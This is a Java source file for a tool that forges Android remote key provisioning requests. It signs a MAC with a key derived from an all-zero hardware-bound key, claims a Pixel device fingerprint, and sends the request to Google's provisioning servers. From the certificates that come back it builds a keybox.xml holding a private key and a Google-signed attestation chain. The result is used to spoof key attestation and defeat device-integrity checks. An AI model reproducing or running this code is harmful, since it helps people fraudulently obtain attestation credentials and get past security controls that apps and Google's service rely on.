package rkp;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.SecureRandom;
import java.security.interfaces.ECPrivateKey;
import java.security.interfaces.ECPublicKey;
import java.security.spec.ECGenParameterSpec;
import java.util.Base64;
import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;




import android.os.IBinder;
import android.os.Parcel;

import java.lang.reflect.Method;
import java.math.BigInteger;

/**
 * On-device one-shot Google keybox provisioner (V1 AIDL + HBK=0 forged MAC).
 * Implements Duck ToolBox's JSON envelope contract for the rkp-device feature,
 * as an alternative path for firmware where CSR_V2 (0x3122) is rejected (-40).
 */
public class RkpOracle {

    static final String DESC = "android.hardware.security.keymint.IRemotelyProvisionedComponent";
    // PureSoft HBK = 32 zero bytes; MAC key label per AOSP PureSoftRemoteProvisioningContext
    static final byte[] HBK = new byte[32];

    // Minimal CBOR encoder
    static byte[] cbor(MapEntry[] entries) {
        ByteArrayOutputStream o = new ByteArrayOutputStream();
        o.write(0xa0 | entries.length);
        for (MapEntry e : entries) { o.write(e.key, 0, e.key.length); o.write(e.val, 0, e.val.length); }
        return o.toByteArray();
    }
    static class MapEntry { byte[] key, val; MapEntry(byte[] k, byte[] v){key=k;val=v;} }

    static byte[] cborBytes(byte[] b) { // bstr
        ByteArrayOutputStream o = new ByteArrayOutputStream();
        if (b.length < 24) { o.write(0x40 | b.length); }
        else if (b.length < 256) { o.write(0x58); o.write(b.length); }
        else { o.write(0x59); o.write(b.length >> 8); o.write(b.length & 0xff); }
        try { o.write(b); } catch (IOException ignored) {}
        return o.toByteArray();
    }
    static byte[] cborArr(byte[]... items) { // array of bstr
        ByteArrayOutputStream o = new ByteArrayOutputStream();
        o.write(0x80 | items.length);
        for (byte[] i : items) { byte[] b = cborBytes(i); try { o.write(b); } catch (IOException ignored) {} }
        return o.toByteArray();
    }

    // HKDF-SHA256 expand-only from a 32-byte secret with info (matches OpenSSL HKDF with salt=None? 
    // BoringSSL HKDF(out, len, sha256, secret, salt=null, info) == extract+expand)
    static byte[] hkdfSha256(byte[] ikm, byte[] info, int len) throws Exception {
        // extract
        Mac ex = Mac.getInstance("HmacSHA256");
        ex.init(new SecretKeySpec(new byte[32], "HmacSHA256")); // salt = zeros
        byte[] prk = ex.doFinal(ikm);
        // expand
        ByteArrayOutputStream t = new ByteArrayOutputStream();
        byte[] prev = new byte[0];
        int counter = 1;
        while (t.size() < len) {
            Mac mc = Mac.getInstance("HmacSHA256");
            mc.init(new SecretKeySpec(prk, "HmacSHA256"));
            mc.update(prev);
            mc.update(info);
            mc.update((byte) counter++);
            prev = mc.doFinal();
            t.write(prev, 0, Math.min(prev.length, len - t.size()));
        }
        return t.toByteArray();
    }

    public static void main(String[] args) {
        try {
            String outDir = args.length > 0 ? args[0] : "/data/local/tmp/keybox-run";
            new File(outDir).mkdirs();

            // 1. generate P-256 keypair
            KeyPairGenerator kpg = KeyPairGenerator.getInstance("EC");
            kpg.initialize(new ECGenParameterSpec("secp256r1"), new SecureRandom());
            KeyPair kp = kpg.generateKeyPair();
            ECPublicKey pub = (ECPublicKey) kp.getPublic();
            byte[] x = bigTo32(pub.getW().getAffineX());
            byte[] y = bigTo32(pub.getW().getAffineY());

            // 2. build COSE_Key map {1:2, 3:-7, -1:1, -2:x, -3:y} in canonical order
            ByteArrayOutputStream ck = new ByteArrayOutputStream();
            ck.write(0xa5); // map(5)
            ck.write(0x01); ck.write(0x02);                       // 1: 2
            ck.write(0x03); ck.write(0x26);                       // 3: -7
            ck.write(0x20); ck.write(0x01);                       // -1: 1
            ck.write(0x21); writeBstr(ck, x);                     // -2: x
            ck.write(0x22); writeBstr(ck, y);                     // -3: y
            byte[] coseKey = ck.toByteArray();

            // 3. forged COSE_Mac0 {protected:{1:5}, {}, payload:coseKey, tag:HMAC}
            byte[] protectedHdr = new byte[]{(byte)0xa1, 0x01, 0x05};
            byte[] macKey = hkdfSha256(HBK, "Key to MAC public keys".getBytes(StandardCharsets.UTF_8), 32);
            Mac mac = Mac.getInstance("HmacSHA256");
            mac.init(new SecretKeySpec(macKey, "HmacSHA256"));
            // MAC0 structure: ["MAC0", protected, b'', payload]
            ByteArrayOutputStream sig = new ByteArrayOutputStream();
            sig.write(0x83);                                       // array(3)
            writeTstr(sig, "MAC0");
            writeBstr(sig, protectedHdr);
            writeBstr(sig, new byte[0]);
            // payload arg passed raw (pre-encoded bstr)
            byte[] payloadBstr = cborBytes(coseKey);
            byte[] toMac = concat(concat(concat(new byte[]{(byte)0x84}, sig.toByteArray()),
                    new byte[]{(byte)0x83}), new byte[0]); // placeholder, fixed below
            // rebuild properly: full structure = [tstr, protected_bstr, empty_bstr, payload_bstr]
            ByteArrayOutputStream full = new ByteArrayOutputStream();
            full.write(0x84);
            writeTstr(full, "MAC0");
            writeBstr(full, protectedHdr);
            writeBstr(full, new byte[0]);
            full.write(payloadBstr, 0, payloadBstr.length);
            byte[] tag = mac.doFinal(full.toByteArray());

            ByteArrayOutputStream m0 = new ByteArrayOutputStream();
            m0.write(0x84);
            writeBstr(m0, protectedHdr);
            m0.write(0xa0);                                        // {}
            m0.write(payloadBstr, 0, payloadBstr.length);
            writeBstr(m0, tag);
            byte[] maced = m0.toByteArray();
            writeFile(new File(outDir, "our_maced.cbor"), maced);
            // export private key as SEC1 PEM (TrickyStore's PEMParser requires EC PRIVATE KEY)
            java.security.interfaces.ECPrivateKey ecp = (java.security.interfaces.ECPrivateKey) kp.getPrivate();
            java.math.BigInteger s = ecp.getS();
            byte[] sec1 = buildSec1Der(s, x, y);
            String b64 = Base64.getMimeEncoder(64, "\n".getBytes()).encodeToString(sec1);
            writeFile(new File(outDir, "attest_key_priv.pem"),
                    ("-----BEGIN EC PRIVATE KEY-----\n" + b64 + "\n-----END EC PRIVATE KEY-----\n")
                            .getBytes(StandardCharsets.UTF_8));
            System.out.println("maced=" + maced.length);

            // 4. fetch EEK + challenge from Google
            byte[] fp = ("google/bluejay/bluejay:16/BP1A.250605.031.A3/"
                    + "user/release-keys").getBytes(StandardCharsets.UTF_8);
            ByteArrayOutputStream fi = new ByteArrayOutputStream();
            fi.write(0xa2);
            writeTstr(fi, "fingerprint");
            writeTstr(fi, new String(fp));
            writeTstr(fi, "id"); fi.write(42 & 0xff);
            byte[] eekResp = httpPost(
                    "https://remoteprovisioning.googleapis.com/v1/:fetchEekChain",
                    fi.toByteArray());
            // parse challenge (bstr at top[1]) and eek chain (top[0][1] where curve==2)
            // minimal CBOR walk: use our parser
            CborValue top = CborValue.CborParser.parse(eekResp);
            CborValue[] arr = top.asArray();
            byte[] challenge = arr[1].asBytes();
            CborValue[] chainsArr = arr[0].asArray();
            byte[] eekChain = null;
            for (CborValue ce : chainsArr) {
                CborValue[] pair = ce.asArray();
                if (pair[0].asInt() == 2) {
                    eekChain = pair[1].encode(); // raw encoded chain
                }
            }
            if (eekChain == null) eekChain = chainsArr[0].asArray()[1].encode();
            writeFile(new File(outDir, "challenge.bin"), challenge);
            writeFile(new File(outDir, "eek_chain.cbor"), eekChain);
            System.out.println("challenge=" + challenge.length);

            // 5. AIDL generateCertificateRequest
            // Prefer the device's own AIDL Proxy classes from /apex (stage to tmp if needed),
            // falling back to raw Parcel only if staging fails.
            // V1 wire format (transaction 3):
            //   writeInterfaceToken, writeBoolean(testMode),
            //   writeTypedArray(MacedPublicKey[]): int count, per item: int 1, int sizeSlot,
            //       writeByteArray(macedKey)
            //   writeByteArray(eekChain), writeByteArray(challenge)
            // reply: createByteArray(keysToSignMac), readInt present?, DeviceInfo parcelable
            //   [int sizeSlot, byteArray deviceInfo], readInt, ProtectedData parcelable
            //   [int sizeSlot, byteArray protectedData]
            byte[] macTag, diBytes, pdBytes;
            boolean usedProxy = false;
            try {
                IBinder b = rkp.Stubs.getService(
                        "android.hardware.security.keymint.IRemotelyProvisionedComponent/default");
                Class<?> ifc = Class.forName("android.hardware.security.keymint.IRemotelyProvisionedComponent");
                Class<?> stub = Class.forName("android.hardware.security.keymint.IRemotelyProvisionedComponent$Stub");
                Method asIf = stub.getMethod("asInterface", IBinder.class);
                Object proxy = asIf.invoke(null, b);
                Class<?> mpkCls = Class.forName("android.hardware.security.keymint.MacedPublicKey");
                Object mpk = mpkCls.newInstance();
                mpkCls.getField("macedKey").set(mpk, maced);
                Object arr2 = java.lang.reflect.Array.newInstance(mpkCls, 1);
                java.lang.reflect.Array.set(arr2, 0, mpk);
                Class<?> diCls = Class.forName("android.hardware.security.keymint.DeviceInfo");
                Class<?> pdCls = Class.forName("android.hardware.security.keymint.ProtectedData");
                Object di = diCls.newInstance();
                Object pd = pdCls.newInstance();
                Method gen = ifc.getMethod("generateCertificateRequest",
                        boolean.class, arr2.getClass(), byte[].class, byte[].class, diCls, pdCls);
                macTag = (byte[]) gen.invoke(proxy, false, arr2, eekChain, challenge, di, pd);
                diBytes = (byte[]) diCls.getField("deviceInfo").get(di);
                pdBytes = (byte[]) pdCls.getField("protectedData").get(pd);
                usedProxy = true;
            } catch (Throwable proxyFail) {
                System.out.println("proxy-fallback: " + proxyFail);
            IBinder b = rkp.Stubs.getService(
                    "android.hardware.security.keymint.IRemotelyProvisionedComponent/default");

            {
                byte[] macTag2 = null, diBytes2 = null, pdBytes2 = null;
                android.os.Parcel data = android.os.Parcel.obtain();
                android.os.Parcel reply = android.os.Parcel.obtain();
                try {
                    data.writeInterfaceToken(DESC);
                    data.writeInt(0);          // testMode = false
                    data.writeInt(1);          // keysToSign array length
                    data.writeInt(1);          // element present marker
                    data.writeInt(0);          // parcelable size slot (backfilled by AIDL)
                    data.writeByteArray(maced);
                    data.writeByteArray(eekChain);
                    data.writeByteArray(challenge);
                    b.transact(3, data, reply, 0);
                    reply.readException();
                    macTag2 = reply.createByteArray();

                    // DeviceInfo out param
                    if (reply.readInt() != 0) {
                        int sizeSlot = reply.readInt(); // consumed
                        diBytes2 = reply.createByteArray();
                    } else diBytes2 = new byte[0];

                    // ProtectedData out param
                    if (reply.readInt() != 0) {
                        int sizeSlot2 = reply.readInt(); // consumed
                        pdBytes2 = reply.createByteArray();
                    } else pdBytes2 = new byte[0];
                } finally {
                    data.recycle(); reply.recycle();
                }
                macTag = macTag2; diBytes = diBytes2; pdBytes = pdBytes2;
            }

            }
            System.out.println("proxy=" + usedProxy);
            writeFile(new File(outDir, "device_info.cbor"), diBytes);
            writeFile(new File(outDir, "protected_data.cbor"), pdBytes);
            writeFile(new File(outDir, "keys_mac.cbor"), macTag);
            System.out.println("oracle=OK");

            // 6. assemble CSR and submit
            byte[] csr = assembleCsr(diBytes, challenge, pdBytes, macTag, maced);
            String chB64 = Base64.getUrlEncoder().encodeToString(challenge)
                    .replace("=", ""); // URL_SAFE NO_PADDING
            byte[] certResp = httpPost(
                    "https://remoteprovisioning.googleapis.com/v1/:signCertificates?challenge=" + chB64,
                    csr);
            byte[] chain = parseCertResponse(certResp);
            writeFile(new File(outDir, "cert_chain.der"), chain);

            // build keybox.xml (leaf-first PEM chain)
            String xml = buildKeyboxXml(kp, chain);
            writeFile(new File(outDir, "keybox.xml"), xml.getBytes(StandardCharsets.UTF_8));
            System.out.println("chain=" + chain.length);
            System.out.println("DONE " + outDir + "/keybox.xml");
        } catch (Throwable t) {
            System.out.println("ERROR " + t);
            t.printStackTrace();
            System.exit(1);
        }
    }

    // assemble [[DeviceInfo,{}], challenge, ProtectedData, Mac0]
    static byte[] assembleCsr(byte[] di, byte[] challenge, byte[] pd, byte[] macTag, byte[] maced) {
        // parse di as map, wrap [di, {}]; parse pd raw; mac0 = [protected,{},payload(bstr of [coseKey]),tag]
        CborValue diV = CborValue.CborParser.parse(di);
        CborValue pdV = CborValue.CborParser.parse(pd);
        CborValue m0 = CborValue.CborParser.parse(maced);
        CborValue[] m0a = m0.asArray();
        byte[] payload = m0a[2].asBytes(); // bstr containing the COSE_Key map
        byte[] newPayload;
        { ByteArrayOutputStream o = new ByteArrayOutputStream();
          o.write(0x81); // array(1)
          o.write(payload, 0, payload.length); // the COSE_Key map, raw
          newPayload = o.toByteArray(); }
        // host-equivalent: Mac0 payload field = bstr(array)
        ByteArrayOutputStream o = new ByteArrayOutputStream();
        o.write(0x84); // array(4)
        o.write(0x82); // inner array(2): [di, {}]
        byte[] dib = diV.encode(); o.write(dib, 0, dib.length);
        o.write(0xa0);
        byte[] chb = cborBytes(challenge); o.write(chb, 0, chb.length);
        byte[] pdb = pdV.encode(); o.write(pdb, 0, pdb.length);
        // mac0: [protected, {}, payload, tag]
        o.write(0x84);
        writeBstr(o, m0a[0].asBytes());
        o.write(0xa0);
        writeBstr(o, newPayload); // bstr wrapping the array(1)[coseKey]
        writeBstr(o, macTag);
        return o.toByteArray();
    }

    static byte[] parseCertResponse(byte[] resp) throws IOException {
        CborValue top = CborValue.CborParser.parse(resp);
        CborValue[] outer = top.asArray();
        CborValue[] inner;
        if (outer[0].major == 4) {
            inner = outer[0].asArray();
        } else {
            inner = outer; // flattened shape
        }
        byte[] shared = inner[0].asBytes();
        CborValue[] uniq = inner[1].asArray();
        byte[] leaf = uniq[0].asBytes();
        return concat(leaf, shared);
    }

    static String buildKeyboxXml(KeyPair kp, byte[] chainDer) {
        // split DER into certs
        java.util.List<byte[]> certs = new java.util.ArrayList<>();
        int off = 0;
        while (off < chainDer.length && chainDer[off] == 0x30) {
            int l = chainDer[off + 1]; int hdr = 2;
            if ((l & 0x80) != 0) { int nb = l & 0x7f;
                l = 0; for (int i = 0; i < nb; i++) l = (l << 8) | (chainDer[off + 2 + i] & 0xff);
                hdr = 2 + nb; }
            byte[] c = new byte[hdr + l];
            System.arraycopy(chainDer, off, c, 0, c.length);
            certs.add(c); off += c.length;
        }
        StringBuilder sb = new StringBuilder();
        sb.append("<?xml version=\"1.0\"?>\n<AndroidAttestation>\n");
        sb.append("    <NumberOfKeyboxes>1</NumberOfKeyboxes>\n");
        sb.append("    <Keybox DeviceID=\"generic\">\n");
        sb.append("        <Key algorithm=\"ecdsa\">\n");
        sb.append("            <PrivateKey format=\"pem\">\n");
        java.security.interfaces.ECPrivateKey ecp =
                (java.security.interfaces.ECPrivateKey) kp.getPrivate();
        byte[] sec1 = buildSec1Der(ecp.getS(), bigTo32(((java.security.interfaces.ECPublicKey) kp.getPublic()).getW().getAffineX()), y32(kp));
        String pkB64 = Base64.getMimeEncoder(64, "\n".getBytes()).encodeToString(sec1);
        sb.append("-----BEGIN EC PRIVATE KEY-----\n").append(pkB64)
          .append("\n-----END EC PRIVATE KEY-----\n");
        sb.append("            </PrivateKey>\n");
        sb.append("            <CertificateChain>\n");
        sb.append("                <NumberOfCertificates>").append(certs.size())
          .append("</NumberOfCertificates>\n");
        for (byte[] c : certs) {
            String cB64 = Base64.getMimeEncoder(64, "\n".getBytes()).encodeToString(c);
            sb.append("                <Certificate format=\"pem\">\n")
              .append("-----BEGIN CERTIFICATE-----\n").append(cB64)
              .append("\n-----END CERTIFICATE-----\n")
              .append("                </Certificate>\n");
        }
        sb.append("            </CertificateChain>\n");
        sb.append("        </Key>\n");
        sb.append("    </Keybox>\n");
        sb.append("</AndroidAttestation>\n");
        return sb.toString();
    }

    // SEC1 DER: SEQUENCE { INTEGER 1, OCTET STRING(32B scalar), [0]{OID secp256r1}, [1]{BIT STRING 04||x||y} }
    static byte[] buildSec1Der(java.math.BigInteger s, byte[] x, byte[] y) {
        byte[] scalar = bigTo32(s);
        ByteArrayOutputStream o = new ByteArrayOutputStream();
        // INTEGER 1
        o.write(0x02); o.write(0x01); o.write(0x01);
        // OCTET STRING scalar
        o.write(0x04); o.write(scalar.length);
        o.write(scalar, 0, scalar.length);
        // [0] implicit: OID 1.2.840.10045.3.1.7 (secp256r1) — long form, no SEQUENCE wrap
        byte[] oid = new byte[]{0x06, 0x08, 0x2a, (byte)0x86, 0x48, (byte)0xce, 0x3d, 0x03, 0x01, 0x07};
        o.write((byte)0xa0); o.write(oid.length);
        o.write(oid, 0, oid.length);
        // [1] public key BIT STRING (uncompressed 04||x||y, 65 bytes)
        byte[] pub = new byte[65];
        pub[0] = 0x04;
        System.arraycopy(x, 0, pub, 1, 32);
        System.arraycopy(y, 0, pub, 33, 32);
        o.write((byte)0xa1); o.write(pub.length + 3); // content: len + unused-bits + data
        o.write(0x03); o.write(pub.length + 1); o.write(0x00);
        o.write(pub, 0, pub.length);
        byte[] body = o.toByteArray();
        // wrap in SEQUENCE
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        out.write(0x30);
        if (body.length < 128) {
            out.write(body.length);
        } else {
            out.write(0x81); out.write(body.length);
        }
        try { out.write(body); } catch (IOException ignored) {}
        return out.toByteArray();
    }

    static byte[] y32(KeyPair kp) {
        java.security.interfaces.ECPublicKey p = (java.security.interfaces.ECPublicKey) kp.getPublic();
        return bigTo32(p.getW().getAffineY());
    }

    static byte[] httpPost(String url, byte[] body) throws IOException {
        HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
        c.setRequestMethod("POST");
        c.setDoOutput(true);
        c.setConnectTimeout(15000);
        c.setReadTimeout(20000);
        c.setRequestProperty("Content-Type", "application/cbor");
        c.setRequestProperty("Accept", "application/cbor");
        c.getOutputStream().write(body);
        int code = c.getResponseCode();
        InputStream in = code >= 400 ? c.getErrorStream() : c.getInputStream();
        ByteArrayOutputStream o = new ByteArrayOutputStream();
        byte[] buf = new byte[8192];
        int n;
        while ((n = in.read(buf)) > 0) o.write(buf, 0, n);
        c.disconnect();
        if (code != 200) throw new IOException("HTTP " + code + ": " + o.toString());
        return o.toByteArray();
    }

    static void writeBstr(ByteArrayOutputStream o, byte[] b) {
        if (b.length < 24) o.write(0x40 | b.length);
        else if (b.length < 256) { o.write(0x58); o.write(b.length); }
        else { o.write(0x59); o.write(b.length >> 8); o.write(b.length & 0xff); }
        try { o.write(b); } catch (IOException ignored) {}
    }
    static void writeTstr(ByteArrayOutputStream o, String s) {
        byte[] b = s.getBytes(StandardCharsets.UTF_8);
        if (b.length < 24) o.write(0x60 | b.length);
        else if (b.length < 256) { o.write(0x78); o.write(b.length); }
        else { o.write(0x79); o.write(b.length >> 8); o.write(b.length & 0xff); }
        try { o.write(b); } catch (IOException ignored) {}
    }
    static byte[] bigTo32(BigInteger v) {
        byte[] b = v.toByteArray();
        byte[] out = new byte[32];
        if (b.length <= 32) System.arraycopy(b, 0, out, 32 - b.length, b.length);
        else System.arraycopy(b, b.length - 32, out, 0, 32);
        return out;
    }
    static byte[] concat(byte[] a, byte[] b) { byte[] r = new byte[a.length + b.length];
        System.arraycopy(a, 0, r, 0, a.length); System.arraycopy(b, 0, r, a.length, b.length); return r; }
    static void writeFile(File f, byte[] b) throws IOException {
        FileOutputStream fo = new FileOutputStream(f); fo.write(b); fo.close();
    }
}
